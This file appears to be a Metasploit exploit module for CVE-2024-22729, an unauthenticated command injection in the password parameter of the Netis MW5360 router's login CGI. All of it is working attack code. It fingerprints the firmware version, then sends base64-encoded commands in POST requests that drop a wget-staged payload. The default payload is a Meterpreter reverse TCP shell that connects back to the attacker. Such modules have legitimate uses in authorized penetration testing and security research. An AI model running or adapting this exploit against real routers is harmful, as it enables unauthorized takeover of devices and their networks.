##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netis router MW5360 unauthenticated RCE.',
        'Description' => %q{
          Netis router MW5360 has a command injection vulnerability via the password parameter on the login page.
          The vulnerability stems from improper handling of the "password" parameter within the router's web interface.
          The router's login page authorization can be bypassed by simply deleting the authorization header,
          leading to the vulnerability. All router firmware versions up to `V1.0.1.3442` are vulnerable.
          Attackers can inject a command in the 'password' parameter, encoded in base64, to exploit the command injection
          vulnerability. When exploited, this can lead to unauthorized command execution, potentially allowing the attacker
          to take control of the router.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Adhikara13' # Discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2024-22729'],
          ['URL', 'https://attackerkb.com/topics/MvCphsf4LN/cve-2024-22729'],
          ['URL', 'https://github.com/adhikara13/CVE/blob/main/netis_MW5360/blind%20command%20injection%20in%20password%20parameter%20in%20initial%20settings.md']
        ],
        'DisclosureDate' => '2024-01-11',
        'Platform' => ['linux'],
        'Arch' => [ARCH_MIPSLE],
        'Privileged' => true,
        'Targets' => [
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_MIPSLE],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 80
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The Netis MW5360 router endpoint URL', '/' ]),
      OptInt.new('CMD_DELAY', [true, 'Delay in seconds between payload commands to avoid locking', 30])
    ])
  end

  def execute_command(cmd, _opts = {})
    # This is a customised linux dropper that only works with the wget command
    # - payload need to be split because command chaining using ';' does not work
    # - each command needs to be executed seperately
    # - time between execution of each command need to be at least 30 seconds or more to avoid a lock
    app_random = Rex::Text.rand_text_alphanumeric(4..8)
    cmd_array = cmd.split(';')
    cmd_array.each_with_index do |command, i|
      # use the filedropper logic to remove the payload file
      register_file_for_cleanup(command) if i == 2
      # skip the manual remove
      break if i == 3

      payload = Base64.strict_encode64("`#{command}`")
      print_status("Executing #{command}")
      send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_set.cgi'),
        'vars_post' => {
          'password' => payload,
          'quick_set' => 'ap',
          'app' => app_random
        }
      })
      # POST request does not return any output to test
      # so wait (default 30 sec) before executing the next command to avoid a lock
      sleep(datastore['CMD_DELAY'])
    end
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/cgi-bin/skk_get.cgi'),
      'vars_post' => {
        'mode_name' => 'skk_get',
        'wl_link' => 0
      }
    })
    return CheckCode::Unknown('No valid response received from target.') unless res && res.code == 200 && res.body.include?('version')

    # trying to get the model and version number
    # unfortunately JSON parsing fails, so we need to use this ugly REGEX :-(
    version = res.body.match(/.?(version).?\s*:\s*.?((\\|[^,])*)/)
    model = res.body.match(/.?(model).?\s*:\s*.?((\\|[^,])*)/)
    unless version.nil? || model.nil?
      version_number = version[2].split('-V')[1].chop
      model_number = model[2].chop
      # Check if target is model MW5360 and running firmware 1.0.1.3442 (newest release 2024-04-24) or lower
      if version_number && model_number == 'MW5360'
        if Rex::Version.new(version_number) <= Rex::Version.new('1.0.1.3442')
          return CheckCode::Appears("Netis #{model_number} #{version_number}")
        else
          return CheckCode::Safe("Netis #{model_number} #{version_number}")
        end
      end
      CheckCode::Safe("#{model_number} #{version_number}")
    end
    CheckCode::Safe
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed
      execute_cmdstager
    end
  end
end
